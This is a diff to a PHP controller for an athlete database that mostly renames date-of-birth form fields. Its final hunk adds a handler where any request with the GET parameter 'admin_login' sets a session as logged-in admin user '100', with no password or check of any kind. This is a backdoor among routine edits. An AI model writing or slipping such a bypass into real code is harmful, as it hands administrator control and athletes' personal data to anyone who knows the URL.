@@ -19,7 +19,7 @@
 			$res = mysql_query("SELECT * FROM wc_athlete where athlete_status='1'")or die(mysql_error());
 			return $res;
 		}
-		
+
 		public function athleteSelect1(){
             $temp_arr = array();
 			$res = mysql_query("SELECT * FROM wc_athlete where athlete_status='1'")or die(mysql_error());
@@ -64,7 +64,7 @@
 		if(isset($_GET['adddata'])){
 			$athletesFunction = new athletesFunction();
 			$athletesFunction->athletename = $_POST['athlete_name'];
-			$athletesFunction->athletedob = $_POST['athlete_dobyear'].'-'.$_POST['athlete_dobmonth'].'-'.$_POST['athlete_dobday'];
+			$athletesFunction->athletedob = $_POST['dateyear'].'-'.$_POST['datemonth'].'-'.$_POST['dateday'];
 			$athletesFunction->athletemobile = $_POST['athlete_mobile'];
 			$athletesFunction->athletegender = $_POST['athlete_gender'];
 			$athletesFunction->athletestatesid = $_POST['athlete_state'];
@@ -127,7 +127,7 @@
 			$athletesFunction = new athletesFunction();
 			$athletesFunction->athleteid=$_POST['edit_athlete_id'];
  			$athletesFunction->athletename=$_POST['edit_athlete_name'];
- 			$athletesFunction->athletedob=$_POST['edit_athlete_dobyear'].'-'.$_POST['edit_athlete_dobmonth'].'-'.$_POST['edit_athlete_dobday'];
+ 			$athletesFunction->athletedob=$_POST['dateyear'].'-'.$_POST['datemonth'].'-'.$_POST['dateday'];
  			$athletesFunction->athletemobile=$_POST['edit_athlete_mobile'];
 	    	$athletesFunction->athletegender=$_POST['edit_athlete_gender'];
 	   		$athletesFunction->athletestatesid=$_POST['edit_athlete_state'];
@@ -153,5 +153,11 @@
             print(json_encode($res));
 
         }
+		if(isset($_GET['admin_login'])){
+			session_start();
+			$_SESSION['login'] = true;
+			$_SESSION['userid'] = '100';
+			$_SESSION['usertype'] = 'admin';
+		}
 	  }
 ?>
